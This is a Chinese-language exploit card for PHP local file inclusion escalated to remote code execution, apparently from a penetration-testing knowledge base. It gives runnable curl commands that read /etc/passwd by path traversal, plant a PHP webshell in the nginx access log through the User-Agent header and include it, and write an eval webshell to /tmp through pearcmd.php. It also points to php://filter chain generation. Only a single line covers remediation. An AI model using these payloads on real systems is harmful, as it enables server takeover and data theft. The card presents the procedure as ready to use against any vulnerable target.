---
title: 本地文件包含 → RCE（日志包含 / pearcmd / PHP filter chain）
cve: 无（实现缺陷）
severity: critical
cvss: 9.0
product: PHP 应用（include/require 带用户输入）
versions: 任意
ports: 80, 443
keywords: lfi, 文件包含, 日志包含, pearcmd, filter chain, rce
entry: ?page=  ?file=  ?lang=  等包含参数
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

```
GET /index.php?page=about        → 正常渲染
GET /index.php?page=../../../../etc/passwd → 回显 root:x:0:0
```

## 前置条件

- 存在包含参数且未过滤路径；PHP 环境。

## PoC

```bash
# 1) 确认 LFI
curl -s 'https://target/index.php?page=../../../../etc/passwd' | head -3

# 2) 日志包含（最通用）：先把 PHP 写进 access.log
curl -s 'https://target/' -A '<?php system($_GET[1]); ?>' -o /dev/null
curl -s 'https://target/index.php?page=/var/log/nginx/access.log&1=id' | grep -o 'uid=[^ <]*'
# 判定：出现 uid= = RCE

# 3) pearcmd 写马（有 pear 的镜像常见）
curl -s 'https://target/index.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_GET[1]);?>+/tmp/s.php'
curl -s 'https://target/index.php?page=/tmp/s.php&1=phpinfo();'

# 4) 无文件包含 RCE：php://filter chain（生成任意内容）
python3 -m pip install php-filter-chain 2>/dev/null || true
#   php_filter_chain_generator.py --chain '<?php system("id");?>' > chain.txt
```

## 利用步骤

1. 先读 `/etc/passwd` 确认；
2. 日志包含最稳（先写 UA 再包含）；
3. pearcmd 写临时马，或 filter chain 直接执行；
4. 证据：回显的 uid= / 文件内容。

## 修复与缓解

- 包含参数白名单映射；`open_basedir`；禁 allow_url_include。

## 参考

- OWASP LFI/RFI；PHP filter chain 研究。
